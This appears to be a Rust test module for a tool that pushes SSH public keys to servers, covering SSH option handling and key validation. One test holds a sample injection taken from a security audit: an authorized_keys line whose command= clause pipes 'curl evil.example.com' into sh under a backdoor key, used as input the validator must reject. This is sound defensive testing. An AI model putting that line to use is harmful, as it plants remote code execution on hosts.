    fn build_push_command_with_source_wires_askpass_without_batch_mode() {
        let auth = PushAuth {
            askpass: Some("keychain".into()),
            ..Default::default()
        };
        let args = push_args(&auth);
        assert!(!has_opt(&args, "BatchMode=yes"), "got: {args:?}");
        let names = push_env_names(&auth);
        assert!(names.iter().any(|n| n == "SSH_ASKPASS"));
        assert!(names.iter().any(|n| n == "SSH_ASKPASS_REQUIRE"));
    }

    #[test]
    fn build_push_command_with_session_password_uses_oneshot_channel() {
        let auth = PushAuth {
            session_password: Some("hunter2".into()),
            ..Default::default()
        };
        let args = push_args(&auth);
        assert!(!has_opt(&args, "BatchMode=yes"), "got: {args:?}");
        assert!(args.iter().all(|a| a != "hunter2"), "secret in argv");
        let names = push_env_names(&auth);
        assert!(names.iter().any(|n| n == "SSH_ASKPASS"));
        assert!(
            names
                .iter()
                .any(|n| n == crate::askpass_env::ONESHOT_SECRET_VAR)
        );
    }

    #[test]
    fn build_push_command_forwards_bw_session() {
        let auth = PushAuth {
            askpass: Some("bw:item".into()),
            bw_session: Some("tok".into()),
            ..Default::default()
        };
        assert!(push_env_names(&auth).iter().any(|n| n == "BW_SESSION"));
    }

    #[test]
    fn build_push_command_always_limits_ssh_to_one_password_attempt() {
        // A background run has one answer to give. A second prompt only
        // sends an empty attempt and burns another failed login.
        for auth in [
            PushAuth::default(),
            PushAuth {
                askpass: Some("keychain".into()),
                ..Default::default()
            },
            PushAuth {
                session_password: Some("hunter2".into()),
                ..Default::default()
            },
        ] {
            let args = push_args(&auth);
            assert!(has_opt(&args, "NumberOfPasswordPrompts=1"), "got: {args:?}");
        }
    }

    #[test]
    fn build_push_command_trust_retry_uses_accept_new() {
        let auth = PushAuth {
            trust_new_host_key: true,
            ..Default::default()
        };
        let args = push_args(&auth);
        assert!(
            has_opt(&args, "StrictHostKeyChecking=accept-new"),
            "got: {args:?}"
        );
        assert!(!has_opt(&args, "StrictHostKeyChecking=yes"));
    }

    #[test]
    fn build_push_command_options_precede_the_separator() {
        let args = push_args(&PushAuth::default());
        let sep = args.iter().position(|a| a == "--").expect("-- present");
        let last_opt = args.iter().rposition(|a| a == "-o").expect("-o present");
        assert!(last_opt < sep, "got: {args:?}");
        assert_eq!(args[sep + 1], "web1");
        assert_eq!(args[sep + 2], REMOTE_SNIPPET);
    }

    #[test]
    fn validate_pubkey_accepts_ed25519() {
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 ops@bastion";
        assert_eq!(validate_pubkey(line).unwrap(), line);
    }

    #[test]
    fn validate_pubkey_strips_trailing_whitespace() {
        let raw = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 ops@bastion\n\r\n";
        let cleaned = validate_pubkey(raw).unwrap();
        assert!(!cleaned.ends_with('\n'));
        assert!(!cleaned.ends_with('\r'));
    }

    #[test]
    fn validate_pubkey_rejects_empty() {
        assert_eq!(validate_pubkey(""), Err(PubkeyValidationError::Empty));
        assert_eq!(
            validate_pubkey("   \n\n"),
            Err(PubkeyValidationError::Empty)
        );
    }

    #[test]
    fn validate_pubkey_rejects_multi_line_command_injection() {
        // The exact PoC from the security audit: two valid lines, the
        // second wears a `command=` clause. Multi-line is the canonical
        // shape that grep-qxF can never dedup, so we reject upstream.
        let raw = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 real@host\ncommand=\"curl evil.example.com|sh\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb2 backdoor@host";
        assert_eq!(validate_pubkey(raw), Err(PubkeyValidationError::MultiLine));
    }

    #[test]
    fn validate_pubkey_rejects_unknown_type() {
        let raw = "ssh-ed25519-cert-v01@openssh.com AAAA cert@host";
        match validate_pubkey(raw) {
            Err(PubkeyValidationError::UnsupportedType(t)) => {
                assert_eq!(t, "ssh-ed25519-cert-v01@openssh.com");
            }
            other => panic!("expected UnsupportedType, got {:?}", other),
        }
    }

    #[test]
    fn validate_pubkey_rejects_bogus_base64() {
        let raw = "ssh-ed25519 not!valid!base64!?? comment";
        assert_eq!(
            validate_pubkey(raw),
            Err(PubkeyValidationError::MalformedBase64)
        );
    }

    #[test]
    fn validate_pubkey_rejects_empty_blob() {
        let raw = "ssh-ed25519  comment";
        assert_eq!(
            validate_pubkey(raw),
            Err(PubkeyValidationError::MalformedBase64)
        );
    }

    #[test]
    fn read_pubkey_file_rejects_oversize() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("huge.pub");
        let body = "x".repeat((PUBKEY_MAX_BYTES + 1) as usize);
        std::fs::write(&path, body).unwrap();
        match read_pubkey_file(&path) {
            Err(PubkeyValidationError::TooLarge(n)) => {
                assert!(n > PUBKEY_MAX_BYTES);
            }
            other => panic!("expected TooLarge, got {:?}", other),
        }
    }

    #[cfg(unix)]
    #[test]
    fn read_pubkey_file_rejects_symlink() {
        let dir = tempfile::tempdir().expect("tempdir");
        let target = dir.path().join("real.pub");
        std::fs::write(&target, "ssh-ed25519 AAAA test@host").unwrap();
        let link = dir.path().join("link.pub");
        std::os::unix::fs::symlink(&target, &link).unwrap();
        assert!(matches!(
            read_pubkey_file(&link),
            Err(PubkeyValidationError::NotARegularFile)
        ));
    }

    #[test]
    fn remote_snippet_has_expected_markers() {
        // Regression guard: the worker parses these three markers; if the
        // snippet ever changes its echoes the parser would silently break.
        assert!(REMOTE_SNIPPET.contains(MARKER_APPENDED));
        assert!(REMOTE_SNIPPET.contains(MARKER_ALREADY_PRESENT));
        assert!(REMOTE_SNIPPET.contains(MARKER_APPEND_FAILED));
        assert!(REMOTE_SNIPPET.contains("grep -qxF"));
        // CRLF guard is in the snippet too; if a future edit drops the
        // tr step, CRLF-terminated authorized_keys files would double-append.
        assert!(REMOTE_SNIPPET.contains("tr -d '\\r'"));
    }
}
